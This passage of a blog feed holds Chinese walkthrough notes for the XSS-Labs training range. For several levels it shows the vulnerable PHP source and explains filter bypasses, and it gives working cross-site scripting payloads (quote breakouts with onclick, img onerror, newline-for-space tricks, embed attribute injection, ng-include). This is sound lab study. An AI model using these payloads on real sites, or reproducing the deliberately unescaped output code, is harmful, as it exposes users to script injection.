A-Z这样的字符，浏览器在发送请求前会做解码；而对于URL不支持的字符，比如%20，浏览器是不做解码的，真正的解码是在服务器上（apache/nginx）做的，服务器解码完成之后传送给php进行过滤.</li><li>如果在浏览器对URL进行二次编码，发送到后端之后，服务器进行一次解码后交给php；虽然可以绕过php过滤，但是返回给浏览器对仍然是二次编码，而浏览器只能进行一次解码，仍无法正常执行。</li><li>同理，如果在浏览器对URL进行base64编码，同样可以绕过过滤；但是浏览器无法解码base64</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS-Labs挑战笔记Level11-20</title>
      <link href="/2020/02/21/XSS-Labs%E6%8C%91%E6%88%98%E7%AC%94%E8%AE%B0Level11-20/"/>
      <url>/2020/02/21/XSS-Labs%E6%8C%91%E6%88%98%E7%AC%94%E8%AE%B0Level11-20/</url>
      
        <content type="html"><![CDATA[<h1 id="level-11"><a class="markdownIt-Anchor" href="#level-11"></a> Level 11</h1><ul><li>后台源码：</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"content-type"</span> content=<span class="string">"text/html;charset=utf-8"</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">"完成的不错！"</span>);</span><br><span class="line"> window.location.href=<span class="string">"level12.php?keyword=good job!"</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level11&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level11&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ref"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li><strong>分析：</strong><ul><li>查看页面源代码，发现多了t_ref的参数，其值是刚刚构造的level10的URL，说明后台读取了HTTP请求包的Referer，并将其写入HTML页面<br /><img src="https://img-blog.csdnimg.cn/20191011170407310.png#pic_center" alt="在这里插入图片描述" /></li><li>与level10同样的过滤方式，只不过把t_sort处也编码了，但是t_ref没有被编码。所以我们使用Mantra的Modify Headers修改HTTP头，将Referer修改为Payload:<br /><img src="https://img-blog.csdnimg.cn/20191012091927367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></li></ul></li><li><strong>Payload：</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;type&#x3D;&quot;text&quot; onclick&#x3D;&quot;alert(1)</span><br></pre></td></tr></table></figure><h1 id="level-12"><a class="markdownIt-Anchor" href="#level-12"></a> Level 12</h1><ul><li>后台源码：</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"content-type"</span> content=<span class="string">"text/html;charset=utf-8"</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">"完成的不错！"</span>);</span><br><span class="line"> window.location.href=<span class="string">"level13.php?keyword=good job!"</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level12&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level12&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ua"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li><strong>分析：</strong><ul><li>查看页面源代码发现HTTP请求包的Agent头被作为隐藏的参数返回到了HTML页面<br /><img src="https://img-blog.csdnimg.cn/20191011172727792.png#pic_center" alt="" /></li><li>于是类似于Level11，用Modify Headers修改HTTP头：<br /><img src="https://img-blog.csdnimg.cn/20191012092020990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></li></ul></li><li><strong>Payload：</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;type&#x3D;&quot;text&quot; onclick&#x3D;&quot;alert(1)</span><br></pre></td></tr></table></figure><h1 id="level-13"><a class="markdownIt-Anchor" href="#level-13"></a> Level 13</h1><ul><li>后台源码：</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"content-type"</span> content=<span class="string">"text/html;charset=utf-8"</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">"完成的不错！"</span>);</span><br><span class="line"> window.location.href=<span class="string">"level14.php"</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level13&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">setcookie(<span class="string">"user"</span>, <span class="string">"call me maybe?"</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_COOKIE[<span class="string">"user"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_cook"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li><strong>分析：</strong><ul><li>查看页面源代码发现四个隐藏的参数，测试发现提交的t_sort和t_cook会显示在页面中</li><li>t_sort是提交的参数，进行了编码回显；t_cook是后台源码设置的cookie，将单引号替换为空，没有进行编码。</li><li>所以，我们用Burp Suit抓包修改cookie值，闭合双引号，显示input标签，利用onclick事件弹框。<br /><img src="https://img-blog.csdnimg.cn/20191012093754330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></li></ul></li><li><strong>Payload：</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;type&#x3D;&quot;text&quot; onclick&#x3D;&quot;alert(1)</span><br></pre></td></tr></table></figure><h1 id="level-14"><a class="markdownIt-Anchor" href="#level-14"></a> Level 14</h1><ul><li><strong>分析：</strong><ul><li>本关属于exif XSS，上传一个含有xss代码的图片触发xss。</li><li>详情关注<a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12" target="_blank" rel="noopener">先知社区</a></li></ul></li></ul><h1 id="level-15"><a class="markdownIt-Anchor" href="#level-15"></a> Level 15</h1><ul><li>后台源码：</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html ng-app&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">        &lt;script src=<span class="string">"angular.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">"完成的不错！"</span>);</span><br><span class="line"> window.location.href=<span class="string">"level16.php?keyword=test"</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level15&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到第<span class="number">15</span>关，自己想个办法走出去吧！&lt;/h1&gt;</span><br><span class="line">&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"src"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;body&gt;&lt;span class="ng-include:'</span>.htmlspecialchars($str).<span class="string">'"&gt;&lt;/span&gt;&lt;/body&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p><strong>分析：</strong></p><ul><li>这里AngularJS ng-include 指令：<ul><li>ng-include 指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。</li><li>默认情况下，包含的文件需要包含在同一个域名下。</li></ul></li><li>源代码包含js的地址不可用，我们将源代码中的angular.min.js改为下述地址：  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cdn.staticfile.org&#x2F;angular.js&#x2F;1.4.6&#x2F;angular.min.js</span><br></pre></td></tr></table></figure></li><li>调用level1的代码，注意payload需要用但引号包裹</li></ul></li><li><p><strong>Payload：</strong></p></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">src&#x3D;&#39;level1.php?name&#x3D;test&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&#39;</span><br></pre></td></tr></table></figure><p>​</p><h1 id="level-16"><a class="markdownIt-Anchor" href="#level-16"></a> Level 16</h1><ul><li>后台源码：</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"content-type"</span> content=<span class="string">"text/html;charset=utf-8"</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">"完成的不错！"</span>);</span><br><span class="line"> window.location.href=<span class="string">"level17.php?arg01=a&amp;arg02=b"</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level16&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level16&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"&amp;nbsp;"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">" "</span>,<span class="string">"&amp;nbsp;"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"/"</span>,<span class="string">"&amp;nbsp;"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">""</span>,<span class="string">"&amp;nbsp;"</span>,$str4);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>.$str5.<span class="string">"&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str5).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li><p><strong>分析：</strong></p><ul><li>过滤了script、空格、/</li><li>用<kbd>换行符%0a</kbd>取代空格，在html中同样可以运行</li></ul></li><li><p><strong>Payload：</strong></p></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img%0asrc&#x3D;&quot;1.jpg&quot;%0aonerror&#x3D;&quot;alert(1)&quot;&gt;</span><br></pre></td></tr></table></figure><h1 id="level-17"><a class="markdownIt-Anchor" href="#level-17"></a> Level 17</h1><ul><li>后台源码：</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"content-type"</span> content=<span class="string">"text/html;charset=utf-8"</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">"完成的不错！"</span>); </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level17&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level17&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf01.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;h2 align=center&gt;成功后，&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li><strong>Payload：</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arg01&#x3D;a&amp;arg02&#x3D;b onmouseover&#x3D;alert(1)</span><br></pre></td></tr></table></figure><ul><li><strong>分析：</strong><ul><li>输出点在arg01和arg02上，输出编码了特殊字符，所以只能用on事件来触发</li><li>因为在embed标签中，src的属性值没有引号，所以在输入arg02时在b之后加一个空格，浏览器到b就停止判断，给src加上双引号；而将onmouseover看作另外一个属性<br /><img src="https://img-blog.csdnimg.cn/20191012160316104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></li><li>而如果在后台源码中将src属性用引号扩起来，浏览器就会将b onmouseover=alert(1)全部看作arg02的值：</li></ul>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#后台源码</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src='xsf01.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">"' width=100% heigth=100%&gt;"</span>;</span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/20191012160816996.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></li></ul><h1 id="level-18"><a class="markdownIt-Anchor" href="#level-18"></a> Level 18</h1><ul><li>跟level17一样？？</li></ul><h1 id="level-19-20"><a class="markdownIt-Anchor" href="#level-19-20"></a> Level 19、20</h1><ul><li>属于Flash XSS，暂且不做分析</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS-Labs挑战笔记Level1-10</title>
      <link href="/2020/02/21/XSS-Labs%E6%8C%91%E6%88%98%E7%AC%94%E8%AE%B0Level1-10/"/>
      <url>/2020/02/21/XSS-Labs%E6%8C%91%E6%88%98%E7%AC%94%E8%AE%B0Level1-10/</url>
      
        <content type="html"><![CDATA[<ul><li>靶场下载地址：<a href="https://github.com/lyshark/xss-labs" target="_blank" rel="noopener">https://github.com/lyshark/xss-labs</a></li><li>每一关的后台源码重写了alert()方法，只要成功弹框即可进入下一关</li></ul><h1 id="level-1"><a class="markdownIt-Anchor" href="#level-1"></a> Level 1</h1><ul><li><strong>后台源码：</strong></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"content-type"</span> content=<span class="string">"text/html;charset=utf-8"</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">"完成的不错！"</span>);</span><br><span class="line"> window.location.href=<span class="string">"level2.php?keyword=test"</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level1&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"name"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;欢迎用户"</span>.$str.<span class="string">"&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li><strong>分析：</strong><br />后台源码将用户以GET方式提交的参数name，原封不动地显示在HTML页面中，所以将弹框语句放入name变量中即可：</li><li><strong>Payload：</strong></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&#39;xss&#39;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h1 id="level-2"><a class="markdownIt-Anchor" href="#level-2"></a> Level 2</h1><ul><li><strong>后台源码：</strong></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"content-type"</span> content=<span class="string">"text/html;charset=utf-8"</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">"完成的不错！"</span>);</span><br><span class="line"> window.location.href=<span class="string">"level3.php?writing=wait"</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level2&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value="搜索"/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><ul><li><p><strong>分析：</strong></p><ul><li><p><kbd>htmlspecialchars</kbd>：</p><ul><li>作用：把预定义的字符转换为 HTML 实体，而不是作为标签运行；如果不用HTMLSpecialChars，就会导致读取时，把&quot; &lt;script&gt;&quot;之类的HTML标签带有功能地输出。</li><li>HTML实体格式：  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;entity_name;</span><br><span class="line">或者</span><br><span class="line">&amp;#entity_number;</span><br></pre></td></tr></table></figure></li><li>转化规则：<br /><img src="https://img-blog.csdnimg.cn/20191011094504385.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70#pic_center" alt="" /></li><li>如下例，在使用了htmlspecialchars后，将输出字符串&quot;<script>alert(‘123’)</script>&quot;；当不使用时，则会弹框。  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str=<span class="string">"&lt;script&gt;alert('123')&lt;/script&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> htmlspecialchars($str); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>本例中，在返回的HTML页面的第一处使用了htmlspecialchars，而第二处没有使用，且两处都没有过滤机制。所以我们在第二处闭合&lt;input&gt;标签，直接弹框：</p></li><li><p><strong>Payload：</strong></p></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h1 id="level-3"><a class="markdownIt-Anchor" href="#level-3"></a> Level 3</h1><ul><li><strong>后台源码：</strong></li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"content-type"</span> content=<span class="string">"text/html;charset=utf-8"</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line">confirm(<span class="string">"完成的不错！"</span>);</span><br><span class="line"> window.location.href=<span class="string">"level4.php?keyword=try harder!"</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level3&lt;/title&gt;</span><br><span 